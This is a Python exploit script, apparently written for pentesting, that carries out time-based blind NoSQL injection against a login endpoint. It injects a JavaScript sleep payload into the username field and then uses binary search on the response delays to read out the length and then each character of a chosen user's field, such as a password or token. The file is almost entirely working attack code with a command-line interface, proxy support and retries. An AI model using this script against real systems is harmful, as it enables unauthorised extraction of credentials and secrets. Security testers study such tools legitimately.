#!/usr/bin/python3
"""
NoSQL Time-Based Blind Injection Exploit

Demonstrates time-based blind NoSQL injection using binary search for efficient
data extraction. Useful for pentesting NoSQL databases (MongoDB, etc.) when direct
error-based feedback is unavailable.

Author: PentestingTech
"""

import requests
import time
import argparse
import sys
from urllib.parse import quote_plus


# Payload markers
USERNAME_MARKER = "USERNAME"
POSITION_MARKER = "POSITION"
CHARACTER_MARKER = "CHAR"
FIELD_MARKER = "FIELD"
SLEEP_MARKER = "SLEEP"
LENGTH_MARKER = "LENGTH"
COMPARATOR_MARKER = "COMPARATOR"

# NoSQL injection payloads for time-based blind exploitation
GET_VALUE_LENGTH_PAYLOAD = "\"; if(this.username=='USERNAME' && this.FIELD.length>LENGTH){sleep(SLEEP)} var x=\""
ENUMERATE_PAYLOAD = "\"; if(this.username=='USERNAME' && this.FIELD.charCodeAt(POSITION) COMPARATOR CHAR){sleep(SLEEP)} var x=\""

# Stage constants
STAGE_GET_LEN = 1
STAGE_DUMP_VALUE = 2

# Global request counter
num_req = 0


def oracle(username, field, position=None, character=None, stage=STAGE_DUMP_VALUE, comparator=">",
           host=None, proto="http", endpoint="/login", use_proxy=False, proxy_url=None, sleep_time=3000,
           timeout=30, verify_ssl=False, time_threshold=3.0, max_retries=3):
    """Execute NoSQL injection oracle to test a condition via time-based blind injection.

    Returns True if response time exceeded time_threshold, False otherwise.
    """
    global num_req
    num_req += 1

    if stage == STAGE_GET_LEN:
        prepared_payload = (
            GET_VALUE_LENGTH_PAYLOAD.replace(USERNAME_MARKER, username)
            .replace(FIELD_MARKER, field)
            .replace(LENGTH_MARKER, str(character))
            .replace(SLEEP_MARKER, str(sleep_time))
        )
    elif stage == STAGE_DUMP_VALUE:
        prepared_payload = (
            ENUMERATE_PAYLOAD.replace(USERNAME_MARKER, username)
            .replace(POSITION_MARKER, str(position))
            .replace(CHARACTER_MARKER, str(character))
            .replace(FIELD_MARKER, field)
            .replace(SLEEP_MARKER, str(sleep_time))
            .replace(COMPARATOR_MARKER, comparator)
        )
    else:
        raise ValueError(f"Unknown stage: {stage}")

    for attempt in range(max_retries):
        try:
            start_time = time.time()

            proxies = None
            if use_proxy and proxy_url:
                proxies = {"http": proxy_url, "https": proxy_url}

            url = f"{proto}://{host}{endpoint}"
            r = requests.post(
                url,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data="username=%s&password=x" % (quote_plus(prepared_payload)),
                timeout=timeout,
                proxies=proxies,
                verify=verify_ssl,
            )
            elapsed_time = time.time() - start_time

            if r.status_code != 200:
                raise Exception(f"HTTP {r.status_code}: {r.reason}")

            return elapsed_time > time_threshold

        except requests.exceptions.Timeout:
            if attempt == max_retries - 1:
                raise Exception(f"Request timed out after {max_retries} retries")
            continue


def exploit(args):
    """Main exploitation routine."""
    global num_req

    print(f"[*] Target: {args.proto}://{args.host}{args.endpoint}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Field: {args.field}")
    print(f"[*] Using Burp Proxy: {args.use_proxy}")
    if args.use_proxy:
        print(f"[*] Proxy: {args.proxy}")
    print()

    # ============================================================================
    # STAGE 1: Determine field length using binary search
    # ============================================================================
    print(f"[*] Enumerating length of field '{args.field}'...")

    length_low, length_high = 1, args.max_length
    while length_low <= length_high:
        length_mid = (length_low + length_high) // 2
        if oracle(
            args.username,
            args.field,
            character=length_mid,
            stage=STAGE_GET_LEN,
            host=args.host,
            proto=args.proto,
            endpoint=args.endpoint,
            use_proxy=args.use_proxy,
            proxy_url=args.proxy,
            sleep_time=args.sleep_time,
            timeout=args.timeout,
            verify_ssl=args.verify_ssl,
            time_threshold=args.threshold,
            max_retries=args.retries,
        ):
            length_low = length_mid + 1
        else:
            length_high = length_mid - 1

    field_length = length_low
    print(f"[+] Field length: {field_length} characters\n")

    # ============================================================================
    # STAGE 2: Dump field value character by character using binary search
    # ============================================================================
    num_req = 0
    recovered_value = ""

    print(f"[*] Dumping field '{args.field}'...")

    for char_index in range(field_length):
        ascii_low, ascii_high = 32, 127  # Printable ASCII range

        while ascii_low <= ascii_high:
            ascii_mid = (ascii_low + ascii_high) // 2

            # Check if character at position is greater than midpoint
            if oracle(
                args.username,
                args.field,
                position=char_index,
                character=ascii_mid,
                stage=STAGE_DUMP_VALUE,
                comparator='>',
                host=args.host,
                proto=args.proto,
                endpoint=args.endpoint,
                use_proxy=args.use_proxy,
                proxy_url=args.proxy,
                sleep_time=args.sleep_time,
                timeout=args.timeout,
                verify_ssl=args.verify_ssl,
                time_threshold=args.threshold,
                max_retries=args.retries,
            ):
                ascii_low = ascii_mid + 1
            # Check if character at position is less than midpoint
            elif oracle(
                args.username,
                args.field,
                position=char_index,
                character=ascii_mid,
                stage=STAGE_DUMP_VALUE,
                comparator='<',
                host=args.host,
                proto=args.proto,
                endpoint=args.endpoint,
                use_proxy=args.use_proxy,
                proxy_url=args.proxy,
                sleep_time=args.sleep_time,
                timeout=args.timeout,
                verify_ssl=args.verify_ssl,
                time_threshold=args.threshold,
                max_retries=args.retries,
            ):
                ascii_high = ascii_mid - 1
            # Character equals midpoint
            else:
                recovered_value += chr(ascii_mid)
                print(f"[+] {args.field}: {recovered_value}".ljust(80), end='\r', flush=True)
                break

    print()  # New line after completion
    print(f"\n[+] Finished dumping field")
    print(f"[+] {args.field}: {recovered_value}")
    print(f"[+] Total requests: {num_req}")


def main():
    """Parse command line arguments and start exploitation."""
    parser = argparse.ArgumentParser(
        description='NoSQL Time-Based Blind Injection Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -H localhost:3000 -u admin -f token
  %(prog)s -H localhost:3000 -u admin -f password --proto https --endpoint /api/login
  %(prog)s -H localhost:3000 -u admin -f password --use-proxy --proxy http://127.0.0.1:8080
  %(prog)s -H target.com:8080 -u user -f secret --sleep-time 2000 --threshold 2.0
        '''
    )

    # Required arguments
    parser.add_argument(
        '-H', '--host',
        required=True,
        help='Target host (e.g., 192.168.1.100:31087)'
    )
    parser.add_argument(
        '-u', '--username',
        required=True,
        help='Target username to extract data for'
    )
    parser.add_argument(
        '-f', '--field',
        required=True,
        help='Field name to extract (e.g., token, password)'
    )

    # Optional arguments
    parser.add_argument(
        '--proto',
        default='http',
        choices=['http', 'https'],
        help='Protocol (default: http)'
    )
    parser.add_argument(
        '--endpoint',
        default='/login',
        help='API endpoint path (default: /login)'
    )
    parser.add_argument(
        '--use-proxy',
        action='store_true',
        help='Route traffic through Burp Proxy (default: False)'
    )
    parser.add_argument(
        '--proxy',
        default='http://127.0.0.1:8080',
        help='Proxy URL (default: http://127.0.0.1:8080)'
    )
    parser.add_argument(
        '--sleep-time',
        type=int,
        default=3000,
        help='Sleep time in milliseconds for injection (default: 3000)'
    )
    parser.add_argument(
        '--threshold',
        type=float,
        default=3.0,
        help='Response time threshold in seconds (default: 3.0)'
    )
    parser.add_argument(
        '--timeout',
        type=int,
        default=30,
        help='Request timeout in seconds (default: 30)'
    )
    parser.add_argument(
        '--retries',
        type=int,
        default=3,
        help='Max retries on timeout (default: 3)'
    )
    parser.add_argument(
        '--max-length',
        type=int,
        default=100,
        help='Maximum field length to search for (default: 100)'
    )
    parser.add_argument(
        '--verify-ssl',
        action='store_true',
        help='Verify SSL certificates (default: False)'
    )

    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        print("\n\n[!] Exploitation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
